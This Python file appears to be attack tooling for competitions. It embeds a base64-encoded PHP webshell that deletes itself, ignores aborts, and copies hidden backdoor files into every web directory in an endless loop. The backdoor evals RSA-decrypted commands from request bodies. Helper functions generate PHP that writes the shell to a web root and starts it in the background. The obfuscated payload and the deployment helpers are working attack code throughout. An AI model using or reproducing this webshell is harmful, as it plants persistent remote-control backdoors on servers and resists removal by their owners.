#!/usr/bin/env python3
# -*- coding: utf-8 -*-

rsa_no_die_shell = """
PD9waHAKICAgIHNldF90aW1lX2xpbWl0KDApOwogICAgaWdub3JlX3VzZXJfYWJvcnQoMSk7Cgog
ICAgJHNoZWxsID0gPDw8RU9UClBEOXdhSEFLQ21Oc1lYTnpJRkpUUVFwN0NpQWdJQ0J3Y21sMllY
UmxJSE4wWVhScFl5QWtVRlZDVEVsRFgwdEZXU0E5SUR3OFBFVlBSZ290TFMwdExVSkZSMGxPSUZC
VlFreEpReUJMUlZrdExTMHRMUXBOU1VkbVRVRXdSME5UY1VkVFNXSXpSRkZGUWtGUlZVRkJORWRP
UVVSRFFtbFJTMEpuVVVORldVOXVNRFoxTVhwV1NWYzBOSE5OV0VNdmNsUkVaM0ZDQ2pObGNtTjVN
VUV5Y0hSbFNqRk1jMEZsYzFCU1oyZHNTWGx6VUZoaFIzQlhja1ZuZEZreE9YUkhWRU1yY201eU1U
VmliV05KUzBaTGIzQk9hbWt5UVRjS2JqWlhOMjlyYUZkdWJXTnNZMVZKYkZsV1VWVkdkMHRuYW1a
cFVHNWhUVEE1WjNCRldrNUVZVkpVYVhKNVMzbEpOalpZWjFoUU1GZDBNbTV6V1VReVdRcEVUbGxN
TDBsNk16SjZlbEZGZWpkcGNuZEpSRUZSUVVJS0xTMHRMUzFGVGtRZ1VGVkNURWxESUV0RldTMHRM
UzB0Q2tWUFJqc0tDaUFnSUNCd2NtbDJZWFJsSUhOMFlYUnBZeUJtZFc1amRHbHZiaUJuWlhSUWRX
SnNhV05MWlhrb0tRb2dJQ0FnZXdvZ0lDQWdJQ0FnSUhKbGRIVnliaUJ2Y0dWdWMzTnNYM0JyWlhs
ZloyVjBYM0IxWW14cFl5aHpaV3htT2pva1VGVkNURWxEWDB0RldTazdDaUFnSUNCOUNnb2dJQ0Fn
Y0hWaWJHbGpJSE4wWVhScFl5Qm1kVzVqZEdsdmJpQndkV0pzYVdORmJtTnllWEIwS0NSa1lYUmhJ
RDBnSnljcENpQWdJQ0I3Q2lBZ0lDQWdJQ0FnYVdZZ0tDRnBjMTl6ZEhKcGJtY29KR1JoZEdFcEtT
QjdDaUFnSUNBZ0lDQWdJQ0FnSUhKbGRIVnliaUJ1ZFd4c093b2dJQ0FnSUNBZ0lIMEtJQ0FnSUNB
Z0lDQWtjbVZ6SUQwZ0p5YzdDaUFnSUNBZ0lDQWdabTl5WldGamFDQW9jM1J5WDNOd2JHbDBLQ1Jr
WVhSaExDQXhNVGNwSUdGeklDUmphSFZ1YXlrZ2V3b2dJQ0FnSUNBZ0lDQWdJQ0J2Y0dWdWMzTnNY
M0IxWW14cFkxOWxibU55ZVhCMEtDUmphSFZ1YXl3Z0pHVnVZM0o1Y0hSRVlYUmhMQ0J6Wld4bU9q
cG5aWFJRZFdKc2FXTkxaWGtvS1NrN0NpQWdJQ0FnSUNBZ0lDQWdJQ1J5WlhNZ0xqMGdKR1Z1WTNK
NWNIUkVZWFJoT3dvZ0lDQWdJQ0FnSUgwS0lDQWdJQ0FnSUNCeVpYUjFjbTRnSkhKbGN5QS9JR0po
YzJVMk5GOWxibU52WkdVb0pISmxjeWtnT2lCdWRXeHNPd29nSUNBZ2ZRb0tJQ0FnSUhCMVlteHBZ
eUJ6ZEdGMGFXTWdablZ1WTNScGIyNGdjSFZpYkdsalJHVmpjbmx3ZENna1pHRjBZU0E5SUNjbktR
b2dJQ0FnZXdvZ0lDQWdJQ0FnSUdsbUlDZ2hhWE5mYzNSeWFXNW5LQ1JrWVhSaEtTa2dld29nSUNB
Z0lDQWdJQ0FnSUNCeVpYUjFjbTRnYm5Wc2JEc0tJQ0FnSUNBZ0lDQjlDaUFnSUNBZ0lDQWdKSEps
Y3lBOUlDY25Pd29nSUNBZ0lDQWdJR1p2Y21WaFkyZ2dLSE4wY2w5emNHeHBkQ2hpWVhObE5qUmZa
R1ZqYjJSbEtDUmtZWFJoS1N3Z01USTRLU0JoY3lBa1kyaDFibXNwSUhzS0lDQWdJQ0FnSUNBZ0lD
QWdiM0JsYm5OemJGOXdkV0pzYVdOZlpHVmpjbmx3ZENna1kyaDFibXNzSUNSa1pXTnllWEIwUkdG
MFlTd2djMlZzWmpvNloyVjBVSFZpYkdsalMyVjVLQ2twT3dvZ0lDQWdJQ0FnSUNBZ0lDQWtjbVZ6
SUM0OUlDUmtaV055ZVhCMFJHRjBZVHNLSUNBZ0lDQWdJQ0I5Q2lBZ0lDQWdJQ0FnY21WMGRYSnVJ
Q2drY21WektTQS9JQ1J5WlhNZ09pQnVkV3hzT3dvZ0lDQWdmUW9LSUNBZ0lIQjFZbXhwWXlCbWRX
NWpkR2x2YmlCZlgyUmxjM1J5ZFdOMEtDa0tJQ0FnSUhzS0lDQWdJQ0FnSUNBa2NtVjBJRDBnYzJW
c1pqbzZjSFZpYkdsalJHVmpjbmx3ZENobWFXeGxYMmRsZEY5amIyNTBaVzUwY3lnaWNHaHdPaTh2
YVc1d2RYUWlLU2s3Q2lBZ0lDQWdJQ0FnYjJKZmMzUmhjblFvS1RzS0lDQWdJQ0FnSUNCbGRtRnNL
Q1J5WlhRcE93b2dJQ0FnSUNBZ0lDUnlaWFFnUFNCdllsOW5aWFJmWTI5dWRHVnVkSE1vS1RzS0lD
QWdJQ0FnSUNCdllsOWxibVJmWTJ4bFlXNG9LVHNLSUNBZ0lDQWdJQ0JsWTJodklITmxiR1k2T25C
MVlteHBZMFZ1WTNKNWNIUW9KSEpsZENrN0NpQWdJQ0I5Q24wS0NtNWxkeUJTVTBFb0tUc0sKRU9U
OwoKICAgIGZ1bmN0aW9uIHdyaXRlU2hlbGwoJHBhdGgpCiAgICB7CiAgICAgICAgZ2xvYmFsICRz
aGVsbDsKICAgICAgICBmb3JlYWNoIChbJ21sdicsJy5tbHYnXSBhcyAkdCkgewogICAgICAgICAg
ICAkdG1wID0gJHBhdGggLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gJHQgLiAiLnBocCI7CiAgICAg
ICAgICAgIGZpbGVfcHV0X2NvbnRlbnRzKCR0bXAsIGJhc2U2NF9kZWNvZGUoJHNoZWxsKSk7CiAg
ICAgICAgICAgIEBjaG1vZCgkdG1wLCAwNTUwKTsKICAgICAgICB9CiAgICB9CiAgICBmdW5jdGlv
biB3YWxrRGlyKCRwYXRoLCAkY2I9bnVsbCkKICAgIHsKICAgICAgICAkbGlzdCA9IGdsb2IoJHBh
dGggLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gJyonKTsKICAgICAgICBmb3JlYWNoICgkbGlzdCBh
cyAkZikgewogICAgICAgICAgICBwcmludF9yKCRmIC4gIlxuIik7CiAgICAgICAgICAgIGlmIChp
c19kaXIoJGYpKSB7CiAgICAgICAgICAgICAgICB3cml0ZVNoZWxsKCRmKTsKICAgICAgICAgICAg
fQogICAgICAgIH0KICAgIH0KCiAgICB1bmxpbmsoX19GSUxFX18pOwogICAgJHBhdGggPSAoZmls
ZV9leGlzdHMoJHBhdGguRElSRUNUT1JZX1NFUEFSQVRPUi4iaW5kZXgucGhwIikgJiYgJF9TRVJW
RVJbJ0RPQ1VNRU5UX1JPT1QnXSAhPSAiIikgPyAkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddIDog
Ii4vIjsKICAgIHdoaWxlICgxKSB7CiAgICAgICAgd3JpdGVTaGVsbCgkcGF0aCk7CiAgICAgICAg
d2Fsa0RpcigkcGF0aCk7CiAgICAgICAgdXNsZWVwKDUwKTsKICAgIH0K""".replace("\n", "")


def exp_upload_shell(path="/var/www/html/shell.php", data="test"):
    """file_put_contents('%s',base64_decode('%s'));
    system('nohup php %s > /dev/null &');
    """
    return """file_put_contents('%s',base64_decode('%s'));
    system('nohup php %s > /dev/null &');
    """ % (path, data, path)


def exp_upload_shell_rsa(path="/var/www/html/shell.php"):
    """Default path="/var/www/html/shell.php"
               data=[rsa_no_die_shell]
    """
    return exp_upload_shell(path, rsa_no_die_shell)


def exp_upload_shell_rsa_abs():
    """Default path="/var/www/html/shell.php"
    """
    return exp_upload_shell_rsa("/var/www/html/shell.php")


def exp_upload_shell_rsa_rel():
    """Default path="./shell.php"
    """
    return exp_upload_shell_rsa("./shell.php")
